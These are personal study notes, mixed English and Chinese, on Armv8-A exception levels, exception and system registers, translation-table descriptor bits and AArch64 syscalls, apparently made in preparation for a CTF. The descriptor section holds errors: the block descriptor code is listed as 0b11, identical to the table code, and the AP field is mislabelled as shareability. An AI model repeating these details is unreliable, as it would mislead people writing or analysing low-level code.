  - When in this state, the PE can access both the **Secure physical address space** and the Non-secure physical address space
- Non-secure state
  - When in this state, the PE can access only the **Non-secure physical address space**
  - Cannot access the Secure system control resources.



<img src="C:\Users\jerry\AppData\Roaming\Typora\typora-user-images\image-20211116153437565.png" alt="image-20211116153437565" style="zoom:67%;" />



EL2

- provides a set of features that support **virtualizing** an Armv8-A implementation
- The basic model of a virtualized system involves:
  - A hypervisor, running in **EL2**, that is responsible for switching between virtual machines
    - A virtual machine comprises **EL1** and **EL0**
  - A number of Guest operating systems
    - A **Guest OS** runs on a virtual machine in **EL1**
  - For each Guest operating system, **applications**, that run on the virtual machine of that Guest OS, usually in **EL0**
- need to implement all of the virtual interrupts:
  - Virtual SError
  - Virtual IRQ
  - Virtual FIQ

Registers for instruction processing and exception handling (D1.6)

- general-purpose registers, R0-R30 (64-bit 為 X0-X30, 32-bit 為 W0-W30)
  - X0 ~ X7 用於傳遞參數 / 執行結果
- SP (x31), PC 等等
- Exception Link Registers (ELRs)
  - hold preferred exception return addresses
- Saved Program Status Registers (SPSRs)
  - used to save PE state on taking exceptions
  - **SPSR_EL1**, for exceptions taken to EL1 using AArch64
  - If EL2 is implemented, **SPSR_EL2**, for exceptions taken to EL2 using AArch64
  - If EL3 is implemented, **SPSR_EL3**, for exceptions taken to EL3 using AArch64
  - When the PE takes an exception, the PE state is saved from **PSTATE** in the **SPSR** at the Exception level the exception is taken to

D1.7 Process state (PSTATE)

- In the Armv8-A architecture, Process state or **PSTATE** is an abstraction of **process state information**
- All of the instruction sets provide instructions that operate on elements of PSTATE

D1.10 Exception entry

- ELR_ELx
  - For an exception taken to an Exception level using AArch64, the Exception Link Register for that Exception level, ELR_ELx, **holds the preferred exception return address**
- 每個 EL 會有對應的 Vector Base Address Register (**VBAR**)，裡面存 exception base address for the table
  - ![image-20211116155323176](C:\Users\jerry\AppData\Roaming\Typora\typora-user-images\image-20211116155323176.png)
  - <img src="https://hernan.de/assets/posts/super-hexagon-a-journey-from-el0-to-s-el3/vbar-levels.png" alt="VBAR Exception Types" style="zoom:50%;" />
  - Asynchronous exceptions
    - IRQ
    - FIQ
    - SError (System Error)
  - Synchronous exceptions
    - 指的就是 system call (SVC)
    - An **ESR_ELx** holds the syndrome information for an exception that is taken to AArch64 stat
      - ![image-20211116160957404](C:\Users\jerry\AppData\Roaming\Typora\typora-user-images\image-20211116160957404.png)
  - register about exception
    - `ESR_ELn` - gives information about the reasons for the exception
    - `FAR_ELn` - holds the faulting virtual address for all synchronous instruction and Data Aborts and alignment faults
    - `ELR_ELn` - holds the address of the instruction that caused the aborting data access (for Data Aborts)
  - svc / hvc / smc
    - `SVC` instructions can be used to call from user applications at EL0 to the kernel at EL1
    - The `HVC` and `SMC` system-call instructions move the processor in a similar fashion to EL2 and EL3
    - ![system_calls.png](https://documentation-service.arm.com/static/5f872814405d955c5176de27?token=)
    - 



**TTBR_ELx**

![image-20211116181850356](C:\Users\jerry\AppData\Roaming\Typora\typora-user-images\image-20211116181850356.png)

- D5.3.1 VMSAv8-64 translation table level -1, level 0, level 1, and level 2 descriptor formats
  - ![image-20211116195816021](C:\Users\jerry\AppData\Roaming\Typora\typora-user-images\image-20211116195816021.png)
- D5.3.2 Armv8 translation table level 3 descriptor formats
  - ![image-20211116200602224](C:\Users\jerry\AppData\Roaming\Typora\typora-user-images\image-20211116200602224.png)

皆是由末 2 bit 來決定 page type：

- Invalid - 0b0
- D_Block - 0b11
- D_Table - 0b11
- D_Page - 0b01

P. 2749

![image-20211116200720569](C:\Users\jerry\AppData\Roaming\Typora\typora-user-images\image-20211116200720569.png)

- upper
  - `PBHA`: Page-based Hardware Attributes bits
    - These bits are IGNORED when FEAT_HPDS2 is not implemented
  - `UXN`: 執行權限。表示 EL0 page 是否可以在同一個 EL 中執行，即 EL0
    - The Execute-never or Unprivileged execute-never field
  - `PXN`: 執行權限。表示 EL0 page 是否可以在上層 EL，即 EL1 中執行
    - The Privileged execute-never field
  - `Contiguous`: 指示它是連續頁面之一的提示
    - a hint bit indicating that the translation table entry is one of a contiguous set of entries
  - `DBM`: Dirty Bit Modifier
  - `GP`: Guarded Page
- lower
  - `nT`: Block translation entry
  - `nG`: non-global
  - `AF`: access flag
  - `SH`: 可分享性字段
  - `AP`: Shareability field
  - `NS`: Non-secure bit (NS)
  - `AttrIndx`: Stage 1 memory attributes index field for the MAIR_ELx

![img](https://documentation-service.arm.com/static/6048f1aaee937942ba30265a?token=)



**SVC**

| function | X8   | X0         | X1         | X2       | X3        |
| -------- | ---- | ---------- | ---------- | -------- | --------- |
| mprotect | 0xE2 | void *addr | size_t len | int prot | -         |
| mmap     | 0xDE | void *addr | size_t len | int prot | int flags |



**Registers**

MRS / MSR

- MRS - P.1236
  - `_ReadStatusReg` in IDA
- MSR - `_WriteStatusReg `
- 像是 `INB`, `OUTB`, `INW`, `OUTW` on x86



- P. 3036

- - (D13.2.118) SCTLR_EL3  - 6_1_0_0
    - Provides **top level control** of the system, including its memory system, at EL3
  - (D13.2.142) VBAR_EL3 - 6_12_0_0
    - Holds the **vector base address** for any **exception** that is taken to EL3
  - (D13.2.115) SCR_EL3 - 6_1_1_0
    - Defines the configuration of the current Security state. It specifies
      - The Security state of EL0, EL1, and EL2
      - The Security state is either Secure or Non-secure
      - The Execution state at lower Exception levels
      - Whether IRQ, FIQ, SError interrupts, and External abort exceptions are taken to EL3
      - Whether various operations are trapped to EL3
  - (D13.3.18) MDCR_EL3 - 6_1_3_1
    - Provides EL3 configuration options for **self-hosted debug** and the **Performance Monitors Extension**
  - (D13.2.32) CPTR_EL3 - 6_1_1_2
    - Controls **trapping to EL3** of accesses to CPACR, CPACR_EL1, HCPTR, CPTR_EL2, trace, Activity Monitor, SVE, and Advanced SIMD and floating-point functionality.
  - (D13.2.125) TCR_EL3
    - The control register for stage 1 of the EL3 translation regime
  - (D13.2.138) TTBR1_EL1 (Translation table (page table))
    - Holds the base address of the **translation table** for the initial lookup for stage 1 of the translation of an address from the higher VA range in the EL1&0 stage 1 translation regime, and other information for this translation regime
  - (D13.2.139) TTBR1_EL2
    - HCR_EL2.E2H == 1
      - holds the base address of the translation table for the initial lookup for stage 1 of the translation of an address from the higher VA range in the EL2&0 translation regime, and other information for this translation regime
    - HCR_EL2.E2H == 0
      - the contents of this register are **ignored by the PE**, except for a direct read or write of the register
  - (D13.2.149) VTTBR_EL2
    - Holds the base address of the **translation table** for the initial lookup for stage 2 of an address translation in the EL1&0 translation regime, and other information for this translation regime







### Compile Arm in x86 Linux

**Install**

```bash
# 64 bits
sudo apt install gcc-9-aarch64-linux-gnu
sudo apt install gcc-aarch64-linux-gnu

# 32 bits
sudo apt install gcc-arm-linux-gnueabihf
```



**disassemble**

```bash
# 64 bits
aarch64-linux-gnu-objdump -d ./bin

# 32 bits
arm-linux-gnueabi-objdump -d ./bin
```



**debug**

```bash
gdb-multiarch -q -x script

# script
target remote :1234

# cmd
i r # 印出所有 register
```





### Reference

- [super-hexagon](https://hernan.de/blog/super-hexagon-a-journey-from-el0-to-s-el3/)
- https://hackmd.io/@bata24/HyMQI7PuB
- https://developer.arm.com/documentation/ddi0487/gb/arm-architecture-reference-manual-armv8-for-armv8-a-architecture-profile
- https://www.itread01.com/content/1543664342.html